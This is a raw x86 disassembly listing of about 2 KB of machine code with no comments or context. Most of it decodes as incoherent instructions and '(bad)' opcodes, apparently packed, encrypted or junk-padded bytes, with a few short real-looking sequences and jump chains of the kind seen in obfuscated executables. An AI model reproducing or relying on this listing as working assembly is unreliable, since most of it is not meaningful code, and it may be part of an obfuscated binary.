  41014d:	jl     0x4100d9
  41014f:	adc    bh,BYTE PTR [eax+ecx*8+0x43]
  410153:	in     eax,dx
  410154:	push   ss
  410155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410156:	jne    0x410107
  410158:	out    0x2f,eax
  41015a:	push   eax
  41015b:	mov    ebx,ebx
  41015d:	cmp    DWORD PTR [esi],eax
  41015f:	mov    ds:0xc7daec5c,al
  410164:	out    dx,eax
  410165:	cwde   
  410166:	fs jmp 0x4100f1
  410169:	js     0x4101b4
  41016b:	aas    
  41016c:	or     DWORD PTR [ecx+0x5c],0xffffff87
  410170:	push   0x133bb48
  410175:	sbb    BYTE PTR [ecx+0x5c],bl
  410178:	les    edi,FWORD PTR [ebx+0x5f]
  41017b:	daa    
  41017c:	inc    eax
  41017d:	cmp    esi,DWORD PTR [edi]
  41017f:	pop    edx
  410180:	adc    al,0x49
  410182:	or     bl,BYTE PTR [edi]
  410184:	int    0x93
  410186:	add    cl,BYTE PTR [edi-0x34]
  410189:	neg    al
  41018b:	leave  
  41018c:	add    ebx,esp
  41018e:	mov    ebp,0x8b796e4
  410193:	mov    ecx,0x5bd2e5ef
  410198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410199:	aaa    
  41019a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019b:	pusha  
  41019c:	inc    ebp
  41019d:	(bad)  
  41019e:	mov    al,0xcf
  4101a0:	pusha  
  4101a1:	arpl   WORD PTR [ebx],bx
  4101a3:	mov    ecx,0xeda5e91e
  4101a8:	jmp    0x410146
  4101aa:	jmp    0x3bebb25e
  4101af:	ret    
  4101b0:	mov    BYTE PTR [edx],0x72
  4101b3:	push   ss
  4101b4:	test   BYTE PTR [eax-0x66],dh
  4101b7:	mov    dh,0xa3
  4101ba:	les    esp,FWORD PTR [esi]
  4101bc:	push   ecx
  4101bd:	iret   
  4101be:	adc    BYTE PTR [eax-0x1b],ah
  4101c1:	sbb    bh,BYTE PTR [edi+0x1e6830fb]
  4101c7:	nop
  4101c8:	jmp    0x410245
  4101ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cb:	inc    esp
  4101cc:	jmp    0x410164
  4101ce:	sbb    BYTE PTR [eax],ah
  4101d0:	dec    ebp
  4101d1:	xchg   DWORD PTR [ecx-0x35],esp
  4101d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101d5:	int    0xa
  4101d7:	sbb    DWORD PTR [eax-0x1268e0ab],esi
  4101dd:	mov    esi,esi
  4101df:	mov    al,ds:0x3c15898
  4101e4:	es sbb eax,0x78672d59
  4101ea:	cli    
  4101eb:	fstp   TBYTE PTR [ebp+0x3c]
  4101ee:	mov    esp,0xebe3fff2
  4101f3:	xchg   ecx,eax
  4101f4:	mov    ebp,DWORD PTR [esi]
  4101f6:	int    0xdf
  4101f8:	cmp    al,0x26
  4101fa:	adc    DWORD PTR [edx-0x12],ebp
  4101fd:	inc    eax
  4101fe:	and    al,0x2
  410200:	add    ebx,DWORD PTR [ebx-0x226830b4]
  410206:	jnp    0x410212
  410208:	jg     0x410227
  41020a:	jle    0x4101b2
  41020c:	push   eax
  41020d:	mov    dl,0x3d
  41020f:	or     al,0x43
  410211:	icebp  
  410212:	fwait
  410213:	xchg   ebp,eax
  410214:	mov    bh,0x59
  410216:	outs   dx,DWORD PTR ds:[esi]
  410217:	mov    eax,ds:0x4b54a11f
  41021c:	add    eax,DWORD PTR [ecx+0x6b5464f4]
  410222:	stos   DWORD PTR es:[edi],eax
  410223:	adc    edx,DWORD PTR [edx-0x7c]
  410226:	xchg   esp,eax
  410227:	gs inc esp
  410229:	popf   
  41022a:	stos   BYTE PTR es:[edi],al
  41022b:	push   ecx
  41022c:	aam    0x47
  41022e:	mov    esp,0x65caa022
  410233:	adc    BYTE PTR [edi],bl
  410235:	mov    dl,0x29
  410237:	into   
  410238:	lock sahf 
  41023a:	fimul  DWORD PTR [ebx-0x6b]
  41023d:	pop    ebx
  41023e:	rol    DWORD PTR [edi-0x1],cl
  410241:	sub    DWORD PTR [ebx-0x6539f69f],ebx
  410247:	lods   eax,DWORD PTR ds:[esi]
  410248:	mov    fs,WORD PTR [esi]
  41024a:	inc    ecx
  41024b:	adc    ch,BYTE PTR [ecx-0x4b589730]
  410251:	popa   
  410252:	lods   eax,DWORD PTR ds:[esi]
  410253:	pop    ebp
  410254:	add    al,0xa7
  410256:	jno    0x4102b6
  410258:	jmp    0xf43b3c7d
  41025d:	cdq    
  41025e:	data16 adc bh,BYTE PTR ds:0x32867b7
  410265:	sbb    ebp,DWORD PTR ds:0xce647b7
  41026b:	in     al,0x76
  41026d:	sub    DWORD PTR [edi+0x6776ba60],esp
  410273:	loopne 0x4102d6
  410275:	jp     0x4102e7
  410277:	push   eax
  410278:	mov    edx,edx
  41027a:	and    ebx,edi
  41027c:	adc    ah,BYTE PTR [eax]
  41027e:	cld    
  41027f:	or     esi,DWORD PTR [ecx-0x14854564]
  410285:	mov    bl,0xbd
  410287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410288:	pop    eax
  410289:	mov    ebx,0x546c740
  41028e:	pop    edx
  41028f:	pop    esp
  410290:	fiadd  WORD PTR [ebx]
  410292:	or     dl,BYTE PTR [edi-0x31]
  410295:	ret    
  410296:	mov    ss,edx
  410298:	jle    0x410265
  41029a:	(bad)  
  41029b:	jmp    0x949b:0xde0b3cc5
  4102a2:	cmp    al,BYTE PTR [esi-0x72188e95]
  4102a8:	xor    DWORD PTR [eax+0x62],ebp
  4102ab:	cmp    dh,al
  4102ad:	mov    cl,0x10
  4102af:	popf   
  4102b0:	or     eax,0x8d61b81
  4102b5:	cs (bad) 
  4102b7:	cmc    
  4102b8:	add    DWORD PTR [edi],esp
  4102ba:	jne    0x41025c
  4102bc:	ds xchg ebx,eax
  4102be:	push   edi
  4102bf:	xchg   edi,eax
  4102c0:	fisttp DWORD PTR [esi+0x59b90258]
  4102c6:	adc    al,0xe3
  4102c8:	cmp    DWORD PTR [edx+0x4b],ebp
  4102cb:	popf   
  4102cc:	xchg   bh,cl
  4102ce:	mov    ds:0x24fc998f,al
  4102d3:	mov    ecx,DWORD PTR [esi]
  4102d5:	xor    ebp,ecx
  4102d7:	cdq    
  4102d8:	fiadd  DWORD PTR [ebx]
  4102da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102db:	pop    esp
  4102dc:	call   0x2cdbc545
  4102e1:	mov    edx,0x5fa0d67c
  4102e6:	pop    ebx
  4102e7:	aam    0xb7
  4102e9:	or     edi,edx
  4102eb:	sbb    DWORD PTR [edx+0x1a0555d7],esp
  4102f1:	adc    esi,edx
  4102f3:	dec    eax
  4102f4:	out    dx,al
  4102f5:	cmp    DWORD PTR gs:[edi+ecx*4],ebp
  4102f9:	outs   dx,DWORD PTR ds:[esi]
  4102fa:	leave  
  4102fb:	xor    eax,0x222036ac
  410300:	sbb    dl,BYTE PTR [edi+0x6a0670bd]
  410306:	test   eax,0xe132698e
  41030b:	mov    ds:0xf68d5a25,al
  410310:	mov    al,0x71
  410312:	add    esp,ebx
  410314:	out    dx,eax
  410315:	add    ch,dl
  410317:	into   
  410318:	pop    ebp
  410319:	pop    eax
  41031a:	nop
  41031b:	fwait
  41031c:	mov    dl,0xcf
  41031e:	data16 fistp DWORD PTR [edx]
  410321:	icebp  
  410322:	or     eax,0x15ade6c2
  410327:	jl     0x4102af
  410329:	fcmovnb st,st(2)
  41032b:	adc    bl,BYTE PTR [ecx]
  41032d:	jmp    0x91dd:0x49472fa3
  410334:	(bad)  
  410335:	ficom  DWORD PTR [esi+ebp*8]
  410338:	das    
  410339:	inc    esi
  41033a:	mov    cl,BYTE PTR [edi]
  41033c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41033d:	jg     0x410390
  41033f:	pop    ecx
  410340:	lds    ecx,FWORD PTR [edx]
  410342:	sub    ebp,DWORD PTR [ecx+edi*1+0x3e248206]
  410349:	adc    ah,BYTE PTR gs:0x4b1ef40d
  410350:	imul   eax,DWORD PTR [edi],0xab14a975
  410356:	mov    dl,0xdd
  410358:	scas   eax,DWORD PTR es:[edi]
  410359:	xchg   ebp,eax
  41035a:	push   es
  41035b:	popf   
  41035c:	outs   dx,DWORD PTR ds:[esi]
  41035d:	stos   BYTE PTR es:[edi],al
  41035e:	movntps XMMWORD PTR [ecx],xmm6
  410361:	aam    0x16
  410363:	je     0x41037b
  410365:	or     al,0xc0
  410367:	stc    
  410368:	sub    eax,0x349f8171
  41036d:	scas   al,BYTE PTR es:[edi]
  41036e:	popf   
  41036f:	add    eax,0x6a44f032
  410374:	mov    ah,BYTE PTR [ebp+ecx*1-0x40]
  410378:	pop    ebp
  410379:	(bad)  [esi-0x3f]
  41037c:	(bad)  
  41037d:	das    
  41037e:	scas   al,BYTE PTR es:[edi]
  41037f:	jae    0x4103f7
  410381:	mov    eax,0x74471434
  410386:	or     DWORD PTR [ebp+eiz*8+0x61],0x2d
  41038b:	and    al,BYTE PTR [ebx-0x54]
  41038e:	xor    eax,0xc2a125a4
  410393:	arpl   WORD PTR [ebx-0x77],di
  410396:	dec    ebp
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd85
  4103a6:	add    ecx,DWORD PTR ds:0x42fd89
  4103ac:	mov    DWORD PTR ds:0x42fd85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e19c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x53b9:0x3364bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    eax,ebx
  4103dc:	out    0x4b,al
  4103de:	out    dx,eax
  4103df:	fist   DWORD PTR [esi]
  4103e1:	pop    eax
  4103e2:	mov    cl,0xdf
  4103e4:	bnd ret 0xfdd5
  4103e8:	mov    ebp,0x52deb3ce
  4103ed:	cld    
  4103ee:	jge    0x4103c0
  4103f0:	mul    ebx
  4103f2:	or     al,0x72
  4103f4:	and    edx,esp
  4103f6:	mov    edi,0xd87cbbae
  4103fb:	dec    esp
  4103fc:	or     cl,BYTE PTR [esi]
  4103fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103ff:	scas   al,BYTE PTR es:[edi]
  410400:	loop   0x4103c4
  410402:	out    0x5d,al
  410404:	add    eax,0xe77e8e33
  410409:	sbb    eax,ebp
  41040b:	cmp    DWORD PTR [edi-0x3e],esp
  41040e:	mov    BYTE PTR [eax],bl
  410410:	(bad)  
  410411:	popf   
  410412:	ja     0x41043c
  410414:	rcr    DWORD PTR [ecx],0x6
  410417:	ja     0x41040b
  410419:	cmc    
  41041a:	test   BYTE PTR [ebx],dl
  41041c:	sti    
  41041d:	fcomp  DWORD PTR [ebp-0x280d94c0]
  410423:	fwait
  410424:	pusha  
  410425:	and    eax,DWORD PTR [ebx]
  410427:	sub    al,0x6a
  410429:	mov    ch,0x4
  41042b:	and    edx,DWORD PTR ds:0x3c7fa35f
  410431:	fisubr DWORD PTR [edx+ecx*4-0x36b47354]
  410438:	push   ebx
  410439:	jg     0x410472
  41043b:	fwait
  41043c:	aad    0x98
  41043e:	(bad)  
  41043f:	sbb    eax,0xd13f1529
  410444:	mov    dh,0xd
  410446:	push   esi
  410447:	fmul   DWORD PTR [ebp+0x3f]
  41044a:	xchg   esp,eax
  41044b:	test   esp,0x16fe9bd8
  410451:	jo     0x410471
  410453:	sbb    ecx,esi
  410455:	sbb    al,0x1a
  410457:	fidiv  DWORD PTR [ebx+0x60b2d7ec]
  41045d:	jno    0x410436
  41045f:	jmp    0x4104b1
  410461:	nop
  410462:	pop    ecx
  410463:	xchg   esp,eax
  410464:	add    eax,DWORD PTR [ebx]
  410466:	(bad)  
  410467:	aad    0xcb
  410469:	mov    al,0xbd
  41046b:	ins    BYTE PTR es:[edi],dx
  41046c:	jle    0x410499
  41046e:	out    dx,eax
  41046f:	fldz   
  410471:	jecxz  0x4104ae
  410473:	cmp    eax,0x133b360a
  410478:	xchg   esp,eax
  410479:	retf   
  41047a:	dec    edi
  41047b:	xor    eax,0xfaa16880
  410480:	sub    eax,0xa92c5a88
  410485:	ss daa 
  410487:	jge    0x4104a6
  410489:	dec    ebp
  41048a:	inc    ecx
  41048b:	inc    edi
  41048c:	sahf   
  41048d:	xor    ch,BYTE PTR [ebx-0x7c]
  410490:	or     al,BYTE PTR [eax-0x10]
  410493:	xor    ecx,0x5aae640a
  410499:	loope  0x4104f7
  41049b:	lock mov bx,0x5ca5
  4104a0:	mov    dh,0xae
  4104a2:	or     al,0x47
  4104a4:	enter  0xec1f,0x9
  4104a8:	std    
  4104a9:	gs dec eax
  4104ab:	cmp    ecx,0xffffffeb
  4104ae:	inc    eax
  4104af:	xlat   BYTE PTR ds:[ebx]
  4104b0:	xor    BYTE PTR [esi+0x72ea8757],bl
  4104b6:	and    ah,0x74
  4104b9:	into   
  4104ba:	in     al,0x36
  4104bc:	sub    ecx,edx
  4104be:	and    al,0xcb
  4104c0:	jno    0x41044b
  4104c2:	xor    eax,0x43254b5b
  4104c7:	jno    0x41051e
  4104c9:	jg     0x4104ff
  4104cb:	add    ecx,ebx
  4104cd:	scas   al,BYTE PTR es:[edi]
  4104ce:	jnp    0x41054b
  4104d0:	push   cs
  4104d1:	sysexit 
  4104d3:	xchg   ebx,eax
  4104d4:	pop    ebx
  4104d5:	int3   
  4104d6:	js     0x4104bc
  4104d8:	scas   al,BYTE PTR es:[edi]
  4104d9:	sahf   
  4104da:	hlt    
  4104db:	xor    BYTE PTR [ebp-0x3a53125],cl
  4104e1:	inc    esp
  4104e2:	inc    ebx
  4104e3:	(bad)  
  4104e4:	xchg   esp,eax
  4104e5:	cli    
  4104e6:	std    
  4104e7:	outs   dx,DWORD PTR ds:[esi]
  4104e8:	out    dx,al
  4104e9:	push   si
  4104eb:	adc    esi,edx
  4104ed:	cdq    
  4104ee:	rcr    ch,0x70
  4104f1:	dec    ecx
  4104f2:	(bad)  
  4104f3:	in     eax,0x86
  4104f5:	arpl   dx,dx
  4104f7:	sub    al,0x55
  4104f9:	mov    ds:0x58c92046,al
  4104fe:	aaa    
  4104ff:	mov    dh,BYTE PTR [ebx-0x2c]
  410502:	fild   QWORD PTR [edi-0x6f764233]
  410508:	stos   BYTE PTR es:[edi],al
  410509:	push   edx
  41050a:	data16 jo 0x410577
  41050d:	jg     0x41050b
  41050f:	mov    dh,0x3d
  410511:	cld    
  410512:	inc    ecx
  410513:	jne    0x4104b8
  410515:	inc    esi
  410516:	das    
  410517:	adc    al,0xcd
  410519:	cs pop ebp
  41051b:	mov    dl,0xe7
  41051d:	sub    BYTE PTR [ebp-0x13],al
  410520:	pop    gs
  410522:	dec    ebp
  410523:	push   ebx
  410524:	fcomp  DWORD PTR [ebp+0x2202e2a8]
  41052a:	adc    ebx,ebp
  41052c:	test   eax,0x89a25ae7
  410531:	lock fisubr WORD PTR [edx+0x6a]
  410535:	mov    edi,0xa174ec06
  41053a:	inc    esp
  41053b:	in     eax,0x4e
  41053d:	test   DWORD PTR [ebx+0x5a],ebx
  410540:	add    BYTE PTR [ecx+eax*4-0x7d],0xd4
  410545:	stos   BYTE PTR es:[edi],al
  410546:	dec    edx
  410547:	sub    eax,0x3009c5c1
  41054c:	add    ebx,DWORD PTR [edi+0x6697211e]
  410552:	xor    eax,0xdf0d2678
  410557:	jae    0x4104ef
  410559:	arpl   WORD PTR [eax+0x64],si
  41055c:	cli    
  41055d:	(bad)  
  41055e:	sbb    al,0xc9
  410560:	xchg   ecx,eax
  410561:	cmp    eax,0x178c51c1
  410566:	inc    ebx
  410567:	daa    
  410568:	fisub  WORD PTR [ecx-0x1a6755e1]
  41056e:	pop    eax
  41056f:	lock pop ds
  410571:	sbb    BYTE PTR [edx+0x5c],0xf0
  410575:	or     eax,0x90d5d4f7
  41057a:	mov    ah,0x89
  41057c:	clc    
  41057d:	addr16 jb 0x41058c
  410580:	add    al,0xc6
  410582:	icebp  
  410583:	pop    ecx
  410584:	push   edi
  410585:	xchg   ebp,eax
  410586:	cmc    
  410587:	jns    0x410565
  410589:	push   edi
  41058a:	jb     0x410605
  41058c:	out    dx,eax
  41058d:	std    
  41058e:	dec    ebp
  41058f:	cwde   
  410590:	icebp  
  410591:	into   
  410592:	pop    ebx
  410593:	inc    ecx
  410594:	cmp    DWORD PTR [esi+ecx*2],0x13ae70c2
  41059b:	scas   eax,DWORD PTR es:[edi]
  41059c:	jecxz  0x410526
  41059e:	sbb    esi,eax
  4105a0:	push   ss
  4105a1:	dec    edi
  4105a2:	adc    al,0xda
  4105a4:	sub    al,ch
  4105a6:	sub    eax,0x1b0712dc
  4105ab:	in     al,dx
  4105ac:	push   0x82cffcca
  4105b1:	push   esi
  4105b2:	push   ebx
  4105b3:	pop    edi
  4105b4:	cld    
  4105b5:	outs   dx,DWORD PTR ds:[esi]
  4105b6:	sahf   
  4105b7:	xchg   ebx,eax
  4105b8:	inc    ebp
  4105b9:	iret   
  4105ba:	add    ebp,DWORD PTR [edi-0x63]
  4105bd:	mov    ds:0xa32cd61d,eax
  4105c2:	add    ah,BYTE PTR [esi]
  4105c4:	sub    BYTE PTR [ecx+0x4b],dl
  4105c7:	out    0x12,eax
  4105c9:	push   edx
  4105ca:	(bad)  
  4105cb:	push   eax
  4105cc:	inc    edx
  4105cd:	lods   al,BYTE PTR ds:[esi]
  4105ce:	dec    ebp
  4105cf:	call   DWORD PTR [esi]
  4105d1:	(bad)
  4105d5:	pop    eax
  4105d6:	jg     0x4105e0
  4105d8:	and    eax,0x2d95378c
  4105dd:	ret    
  4105de:	cdq    
  4105df:	je     0x410573
  4105e1:	mov    bl,0x71
  4105e3:	or     DWORD PTR [ecx+edi*2-0x64],0xffffff8b
  4105e8:	adc    BYTE PTR [ecx-0x11bd6c97],cl
  4105ee:	pop    edx
  4105ef:	inc    ebx
  4105f0:	add    bl,dh
  4105f2:	mov    dl,0x5d
  4105f4:	pusha  
  4105f5:	je     0x410658
  4105f7:	rol    BYTE PTR [ebp+0x1994f474],0x1
  4105fe:	ror    bh,1
  410600:	ret    0xf391
  410603:	aaa    
  410604:	shl    DWORD PTR [ebp+0x637f1b3],1
  41060a:	push   ebx
  41060b:	retf   0xc284
  41060e:	aaa    
  41060f:	(bad)  
  410610:	std    
  410611:	loop   0x4105fd
  410613:	xchg   edx,eax
  410614:	es mov esp,0xfe3f0556
  41061a:	jp     0x410685
  41061c:	sbb    edi,DWORD PTR [ecx+0x66c9398d]
  410622:	sub    DWORD PTR [edi-0x2fd1bd6f],edx
  410628:	dec    ecx
  410629:	fbld   TBYTE PTR [edx]
  41062b:	jnp    0x4106a0
  41062d:	sbb    BYTE PTR [edx],al
  41062f:	(bad)  
  410630:	lahf   
  410631:	mov    dl,0xe2
  410633:	dec    ebx
  410634:	(bad)  [ecx+esi*1-0x4d60c8f6]
  41063b:	rcl    esi,0xd2
  41063e:	xor    DWORD PTR [ecx-0x80],ebp
  410641:	inc    ecx
  410642:	inc    ecx
  410643:	std    
  410644:	pop    ecx
  410645:	xor    eax,0x80676a00
  41064a:	(bad)  
  41064c:	fisubr DWORD PTR ss:[ebx-0x5eb988bd]
  410653:	inc    edx
  410654:	pop    es
  410655:	popf   
  410656:	or     eax,0xb255607b
  41065b:	int3   
  41065c:	jp     0x4106c1
  41065e:	aaa    
  41065f:	push   ebx
  410660:	rcl    DWORD PTR [esi],1
  410662:	addr16 leave 
  410664:	pop    esp
  410665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410666:	mul    DWORD PTR [esi-0x10]
  410669:	cmp    al,0xfc
  41066b:	cmp    BYTE PTR [edi+0x16],cl
  41066e:	test   DWORD PTR [ebx],edx
  410670:	mov    cl,0x6f
  410672:	stos   BYTE PTR es:[edi],al
  410673:	sub    al,0x15
  410675:	cmp    ebx,DWORD PTR [eax-0x28]
  410678:	pop    ds
  410679:	jne    0x4106f0
  41067b:	or     eax,0x4d008d70
  410680:	dec    edi
  410681:	jle    0x410696
  410683:	push   ds
  410684:	jae    0x4106c7
  410686:	and    DWORD PTR [esi],0x2a
  410689:	(bad)
  41068c:	shl    BYTE PTR [edi],cl
  41068e:	push   esp
  41068f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410690:	loopne 0x4106bb
  410692:	xor    esp,edi
  410694:	stos   BYTE PTR es:[edi],al
  410695:	scas   eax,DWORD PTR es:[edi]
  410696:	outs   dx,DWORD PTR ds:[esi]
  410697:	nop
  410698:	lea    eax,[eax]
  41069a:	mov    WORD PTR [edx],?
  41069c:	out    dx,al
  41069d:	ss js  0x4106b5
  4106a0:	mov    ecx,0x419b2751
  4106a5:	aas    
  4106a6:	adc    ch,ch
  4106a8:	push   es
  4106a9:	mov    eax,ds:0xd9b2e199
  4106ae:	mov    WORD PTR [edi],?
  4106b0:	fwait
  4106b1:	dec    ebp
  4106b2:	stos   BYTE PTR es:[edi],al
  4106b3:	je     0x4106ef
  4106b5:	pushf  
  4106b6:	lahf   
  4106b7:	ror    DWORD PTR [esi-0x54e12ed9],cl
  4106bd:	hlt    
  4106be:	pop    ebp
  4106bf:	call   0x8efe:0x62b64a7b
  4106c6:	aam    0x28
  4106c8:	(bad)  
  4106c9:	ror    BYTE PTR [edi-0x1b30415a],cl
  4106cf:	dec    ecx
  4106d0:	pop    ecx
  4106d1:	(bad)  
  4106d2:	mov    bl,0x31
  4106d4:	popa   
  4106d5:	add    DWORD PTR [edx-0x5b],ebp
  4106d8:	out    dx,al
  4106d9:	popa   
  4106da:	hlt    
  4106db:	xor    al,BYTE PTR [eax+0x3b895672]
  4106e1:	inc    ebx
  4106e2:	pop    ecx
  4106e3:	xor    ecx,DWORD PTR [edi+0x5babcdd5]
  4106e9:	mov    edi,0x1b4e7bb6
  4106ee:	cmp    BYTE PTR [edi+0x16],dl
  4106f1:	jle    0x41067e
  4106f3:	rcl    DWORD PTR [ecx-0x58],1
  4106f6:	sbb    dl,ah
  4106f8:	retf   0xfac6
  4106fb:	ror    DWORD PTR [ecx],cl
  4106fd:	jnp    0x41068f
  4106ff:	xchg   dl,bh
  410701:	ins    DWORD PTR es:[edi],dx
  410702:	(bad)  
  410703:	push   0x64
  410705:	setb   BYTE PTR [eax+0x24522c7e]
  41070c:	sub    al,ch
  41070e:	adc    eax,0x1ca99e18
  410713:	mov    eax,0x7f86ad27
  410718:	sahf   
  410719:	mov    esi,0xdd960d5c
  41071e:	xchg   esp,eax
  41071f:	jae    0x410763
  410721:	popa   
  410722:	addr16 or eax,0x8a7063a3
  410728:	add    bh,al
  41072a:	in     al,dx
  41072b:	xlat   BYTE PTR ds:[ebx]
  41072c:	jl     0x7f6eb25f
  410732:	(bad)  
  410734:	idiv   DWORD PTR [ecx]
  410736:	cld    
  410737:	ror    BYTE PTR [eax+0x483c9ee5],cl
  41073d:	sbb    esp,esp
  41073f:	cwde   
  410740:	es stos BYTE PTR es:[edi],al
  410742:	ret    0x4613
  410745:	test   DWORD PTR [edx+0x4f],0xcd3cd053
  41074c:	stos   DWORD PTR es:[edi],eax
  41074d:	mov    edx,0xf1971105
  410752:	or     ch,BYTE PTR [edi+0x1bf5baad]
  410758:	mov    ebp,0xf098dcd6
  41075d:	and    BYTE PTR [esi-0x6bee8adc],bl
  410763:	jne    0x41076d
  410765:	shl    DWORD PTR [edi],0x9
  410768:	ret    
  410769:	dec    edi
  41076a:	or     ebx,DWORD PTR [ebx+0x1]
  41076d:	jmp    0x358ee375
  410772:	mov    esi,0x833c3997
  410777:	inc    ecx
  410778:	fsin   
  41077a:	repz mov esp,0x43cb0e4d
  410780:	push   es
  410781:	cs ror esi,cl
  410784:	mov    bl,0xab
  410786:	cli    
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	daa    
  4107a9:	mov    cl,dh
  4107ab:	jmp    0x410738
  4107ad:	inc    esi
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0xd670707d,eax
  4107b5:	jl     0x41073e
  4107b7:	ret    
  4107b8:	adc    ch,BYTE PTR [ebp+0x49]
  4107bb:	out    dx,eax
  4107bc:	retf   
  4107bd:	pop    edx
  4107be:	sub    ecx,DWORD PTR [ebp-0x69]
  4107c1:	adc    al,0xed
  4107c3:	push   es
  4107c4:	add    DWORD PTR [ebp+0x10],edx
  4107c7:	ja     0x410814
  4107c9:	pop    ebp
  4107ca:	aad    0x72
  4107cc:	sbb    al,0x9b
  4107ce:	adc    esp,esp
  4107d0:	add    BYTE PTR [esi-0x2f24499f],dh
  4107d6:	sbb    eax,0x3d8897a3
  4107db:	pop    eax
  4107dc:	push   esi
  4107dd:	add    al,0xfb
  4107df:	push   0xf32a628d
  4107e4:	aam    0x11
  4107e6:	push   esp
  4107e7:	jge    0x410816
  4107e9:	adc    ebp,DWORD PTR [edi+0x3f]
  4107ec:	imul   DWORD PTR [eax-0x4e93608d]
  4107f2:	lds    esi,FWORD PTR [ebx+0xb490e70]
  4107f8:	mov    edx,0xd59b2896
  4107fd:	xchg   edx,eax
  4107fe:	jmp    0x40a11afb
  410803:	mov    ebp,0x838e8af0
  410808:	xchg   edi,eax
  410809:	enter  0x2a4,0x72
  41080d:	ret    
  41080e:	imul   edx,DWORD PTR [edx+0x9],0xe55df7d6
  410815:	nop
  410816:	mov    ?,ebp
  410818:	fs mov cl,0xcb
  41081b:	pop    ebx
  41081c:	int3   
  41081d:	test   eax,0xd0811ca9
  410822:	fbld   TBYTE PTR [ebx-0x2ec71376]
  410828:	jb     0x41084a
  41082a:	std    
  41082b:	xchg   edx,eax
  41082c:	test   esi,0x53c40b0f
  410832:	mov    al,ds:0x7afea8ca
  410837:	mov    ebx,0xe58dae58
  41083c:	aam    0xff
  41083e:	or     BYTE PTR [eax-0x67],0xd5
  410842:	out    0x93,eax
  410844:	pop    ds
  410845:	or     BYTE PTR [esi],bh
  410847:	and    eax,0x3e30c078
  41084c:	jnp    0x41082b
  41084e:	mov    al,0x7f
  410850:	pop    ebx
  410851:	repnz into 
  410853:	into   
  410854:	cld    
  410855:	clc    
  410856:	outs   dx,BYTE PTR ds:[esi]
  410857:	pop    ebp
  410858:	(bad)  
  41085a:	rcl    edx,0xd7
  41085d:	imul   ebp,DWORD PTR [edx+edi*8-0x497a8fc3],0x54
  410865:	xlat   BYTE PTR ds:[ebx]
  410866:	fistp  QWORD PTR [ecx]
  410868:	sub    DWORD PTR [edx-0x3496bcc4],edx
  41086e:	adc    DWORD PTR [ebx+0x67],edi
  410871:	dec    cx
  410873:	inc    eax
  410874:	repz call 0x4fd9:0xa4bc2a10
  41087c:	mov    cl,0x2f
  41087e:	push   es
  41087f:	cmp    eax,0xb17a1814
  410884:	sbb    cl,BYTE PTR [ecx+0x62]
  410887:	loop   0x4108b4
  410889:	shl    BYTE PTR [ebp+0x44e57869],1
  41088f:	dec    ebp
  410890:	pusha  
  410891:	lea    ebx,[esi+edi*1-0x3]
  410895:	je     0x4108d4
  410897:	arpl   WORD PTR [edx+0x5a3a810d],bp
  41089d:	out    dx,al
  41089e:	test   bl,dh
  4108a0:	pop    es
  4108a1:	je     0x410834
  4108a3:	(bad)  
  4108a4:	in     eax,0x5
  4108a6:	xlat   BYTE PTR ds:[ebx]
  4108a7:	adc    esp,ecx
  4108a9:	(bad)  
  4108aa:	cmp    eax,0x51c38149
  4108af:	dec    edi
  4108b0:	sbb    ch,BYTE PTR [esi]
  4108b2:	(bad)  
  4108b3:	retf   
  4108b4:	xor    BYTE PTR [ebx+0x25e4cfd9],bl
  4108ba:	adc    ecx,DWORD PTR [eax]
  4108bc:	test   BYTE PTR [edi],dl
  4108be:	xor    ebp,DWORD PTR gs:[ecx+0x658e69bf]
  4108c5:	out    0x11,al
  4108c7:	mov    ch,BYTE PTR [ecx+edi*2-0x25]
  4108cb:	push   edx
  4108cc:	aas    
  4108cd:	imul   esi,DWORD PTR [esi+0x659d52e2],0x2862d942
  4108d7:	mov    ah,0xfc
  4108d9:	mov    dh,0xeb
  4108db:	(bad)  
  4108dc:	scas   eax,DWORD PTR es:[edi]
  4108dd:	mov    ecx,0x72d29c21
  4108e2:	leave  
  4108e3:	mov    cl,0xd6
  4108e5:	mov    WORD PTR [edx],es
  4108e7:	lea    esi,[esi+0x6e]
  4108ea:	mov    ds:0x26ba3b3c,al
  4108ef:	xor    eax,0x8c4a51ed
  4108f4:	les    edx,FWORD PTR [esi]
  4108f6:	add    al,0xa9
  4108f8:	mov    ch,0x66
  4108fa:	cmp    edx,esp
  4108fc:	cmp    ecx,ebx
  4108fe:	jle    0x410922
  410900:	lahf   
  410901:	test   BYTE PTR [edi-0x67],0xdc
  410905:	xchg   edx,eax
  410906:	fptan  
  410908:	xchg   ebx,eax
  410909:	ds inc edi
  41090b:	std    
  41090c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41090d:	(bad)  
  41090e:	nop
  41090f:	stos   DWORD PTR es:[edi],eax
  410910:	cmp    eax,0x5204e9b2
  410915:	clc    
  410916:	sub    esi,DWORD PTR [edi]
